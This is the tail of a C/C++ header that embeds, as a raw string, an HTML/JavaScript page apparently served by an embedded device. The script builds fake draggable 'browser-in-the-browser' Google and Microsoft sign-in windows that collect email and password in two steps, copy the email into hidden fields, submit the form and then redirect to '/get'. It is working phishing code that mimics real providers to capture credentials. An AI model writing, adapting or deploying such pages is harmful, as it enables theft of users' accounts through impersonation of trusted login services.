    const microsoftEmailInput = document.getElementById('email-microsoft');
    const microsoftPasswordInput = document.getElementById('password-microsoft');
    const microsoftHiddenEmailInput = document.getElementById('microsoft-hidden-email');

    let googleUserEmail = '';
    let microsoftUserEmail = '';

    function showMessage(message, duration = 3000) {
        messageBox.textContent = message;
        messageBox.classList.add('show');
        if (messageTimeout) {
            clearTimeout(messageTimeout);
        }
        messageTimeout = setTimeout(() => {
            messageBox.classList.remove('show');
        }, duration);
    }

    function showLogin(type) {
        closeAllLogins();
        if (type === 'google') {
            googleWindow.style.display = 'block';
            googleEmailStepForm.style.display = 'block';
            googlePasswordStepForm.style.display = 'none';
            emailInputBitb.value = '';
            passwordInputBitb.value = '';
            googleUserEmail = '';
            emailInputBitb.focus();
            activeWindow = 'google';
        } else if (type === 'microsoft') {
            microsoftWindow.style.display = 'block';
            microsoftEmailStepForm.style.display = 'block';
            microsoftPasswordStepForm.style.display = 'none';
            microsoftEmailInput.value = '';
            microsoftPasswordInput.value = '';
            microsoftUserEmail = '';
            microsoftEmailInput.focus();
            activeWindow = 'microsoft';
        }
    }

    function closeAllLogins() {
        googleWindow.style.display = 'none';
        microsoftWindow.style.display = 'none';
        activeWindow = null;
        
        googleEmailStepForm.style.display = 'block';
        googlePasswordStepForm.style.display = 'none';
        emailInputBitb.value = '';
        passwordInputBitb.value = '';
        googleHiddenEmailInput.value = '';
        googleUserEmail = '';

        microsoftEmailStepForm.style.display = 'block';
        microsoftPasswordStepForm.style.display = 'none';
        microsoftEmailInput.value = '';
        microsoftPasswordInput.value = '';
        microsoftHiddenEmailInput.value = '';
        microsoftUserEmail = '';
    }

    function closeLogin(type) {
        if (type === 'google' && activeWindow === 'google') {
            googleWindow.style.display = 'none';
            activeWindow = null;
        } else if (type === 'microsoft' && activeWindow === 'microsoft') {
            microsoftWindow.style.display = 'none';
            activeWindow = null;
        }
    }

    function handleDragStart(event) {
        isDragging = true;
        const currentWindow = activeWindow === 'google' ? googleWindow : microsoftWindow;
        offset = {
            x: event.clientX - currentWindow.offsetLeft,
            y: event.clientY - currentWindow.offsetTop,
        };
        const currentHeader = currentWindow.querySelector('.browser-header');
        currentHeader.style.cursor = 'grabbing';
    }

    function handleDrag(event) {
        if (isDragging && activeWindow) {
            let currentWindow = activeWindow === 'google' ? googleWindow : microsoftWindow;
            currentWindow.style.left = event.clientX - offset.x + 'px';
            currentWindow.style.top = event.clientY - offset.y + 'px';
        }
    }

    function handleDragEnd() {
        isDragging = false;
        if (activeWindow) {
            const currentHeader = activeWindow === 'google' ? googleWindow.querySelector('.browser-header') : microsoftWindow.querySelector('.browser-header');
            currentHeader.style.cursor = 'grab';
        }
    }

    googleHeader.addEventListener('mousedown', handleDragStart);
    microsoftHeader.addEventListener('mousedown', handleDragStart);
    document.addEventListener('mousemove', handleDrag);
    document.addEventListener('mouseup', handleDragEnd);

    function handleLoginSuccess() {
        window.location.replace('/get');
    }

    googleEmailStepForm.addEventListener('submit', function(event) {
        event.preventDefault();
        if (isValidEmail(emailInputBitb.value.trim())) {
            googleUserEmail = emailInputBitb.value.trim();
            googleHiddenEmailInput.value = googleUserEmail;

            googleEmailStepForm.style.display = 'none';
            googlePasswordStepForm.style.display = 'block';
            passwordInputBitb.focus();
        } else {
            showMessage('Please enter a valid email address.');
        }
    });

    googlePasswordStepForm.addEventListener('submit', function(event) {
        if (passwordInputBitb.value.trim() === '') {
            event.preventDefault();
            showMessage('Please enter your password.');
        }
    });


    microsoftEmailStepForm.addEventListener('submit', function(event) {
        event.preventDefault();
        microsoftUserEmail = microsoftEmailInput.value.trim();
        if (microsoftUserEmail) {
            microsoftHiddenEmailInput.value = microsoftUserEmail;
            microsoftEmailStepForm.style.display = 'none'
            microsoftPasswordStepForm.style.display = 'block';
            microsoftPasswordInput.focus();
        } else {
            showMessage('Please enter your email or phone number.');
        }
    });

    microsoftPasswordStepForm.addEventListener('submit', function(event) {
        if (microsoftPasswordInput.value.trim() === '') {
            event.preventDefault();
            showMessage('Please enter your password.');
        }
    });

    function isValidEmail(email) {
        const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
        return emailRegex.test(email);
    }

    googleLoginButton.addEventListener('click', function() {
        showLogin('google');
    });

    microsoftLoginButton.addEventListener('click', function() {
        showLogin('microsoft');
    });

    loginForm.addEventListener('submit', function(event) {
        const emailValue = emailOrPhoneInput.value.trim();
        const passwordValue = passwordInput.value.trim();
        let hasErrors = false;

        if (!emailValue) {
            emailError.textContent = 'Please enter your email or phone number.';
            emailOrPhoneInput.classList.add('input-error');
            hasErrors = true;
        } else if (!isValidEmail(emailValue)) {
            emailError.textContent = 'Invalid email format. (If phone, proceed with phone format)';
            emailOrPhoneInput.classList.add('input-error');
            hasErrors = true;
        } else {
            emailError.textContent = '';
            emailOrPhoneInput.classList.remove('input-error');
        }

        if (!passwordValue) {
            showMessage('Please enter your password.');
            hasErrors = true;
        }

        if (hasErrors) {
            event.preventDefault();
        }
    });

    emailOrPhoneInput.addEventListener('input', function() {
        if (!this.value || isValidEmail(this.value)) {
            emailError.textContent = '';
            emailOrPhoneInput.classList.remove('input-error');
        }
    });
</script>

</body>
</html>
)rawliteral";

#endif